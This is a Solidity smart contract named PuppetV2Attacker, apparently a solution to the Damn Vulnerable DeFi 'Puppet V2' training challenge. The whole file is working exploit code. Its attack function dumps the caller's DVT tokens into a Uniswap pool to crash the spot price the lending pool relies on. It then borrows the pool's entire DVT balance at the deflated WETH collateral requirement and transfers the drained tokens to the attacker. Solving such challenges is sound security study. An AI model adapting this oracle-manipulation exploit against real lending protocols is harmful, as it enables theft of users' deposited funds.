pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface ILendingPool {
    function calculateDepositOfWETHRequired(uint256 borrowAmount)
        external
        returns (uint256);

    function borrow(uint256 borrowAmount) external;
}

interface IWETH {
    function approve(address spender, uint256 amount) external;

    function balanceOf(address account) external returns (uint256);

    function deposit() external payable;
}

contract PuppetV2Attacker {
    IERC20 private immutable dvt;
    IWETH private immutable weth;
    IUniswapV2Router private immutable uniswapRouter;
    ILendingPool private immutable lendingPool;
    address private attacker;

    constructor(
        address _dvt,
        address _weth,
        address _uniswapRouter,
        address _lendingPool
    ) {
        dvt = IERC20(_dvt);
        weth = IWETH(_weth);
        uniswapRouter = IUniswapV2Router(_uniswapRouter);
        lendingPool = ILendingPool(_lendingPool);
        attacker = msg.sender;
    }

    // @dev: before calling this function, attacker needs to approve the contract to spend his DVT.
    function attack() external {
        require(
            dvt.transferFrom(attacker, address(this), dvt.balanceOf(attacker)),
            "PuppetV2Attacker: DVT transfer failed"
        );
        uint256 initialAttackerBalance = dvt.balanceOf(address(this));
        dvt.approve(address(uniswapRouter), initialAttackerBalance);
        address[] memory path = new address[](2);
        path[0] = address(dvt);
        path[1] = address(weth);
        uniswapRouter.swapExactTokensForTokens(
            initialAttackerBalance,
            0,
            path,
            address(this),
            block.timestamp + 1200
        );
        uint256 initialPoolBalance = dvt.balanceOf(address(lendingPool));
        uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(
            initialPoolBalance
        );
        uint256 attackerWethBalance = weth.balanceOf(address(this));
        uint256 wethShort = depositRequired - attackerWethBalance;
        weth.deposit{value: wethShort}();
        weth.approve(address(lendingPool), depositRequired);
        lendingPool.borrow(initialPoolBalance);
        require(
            dvt.transfer(attacker, initialPoolBalance),
            "PuppetV2Attacker: Failed to transfer DVT to attacker"
        );
    }

    receive() external payable {}
}
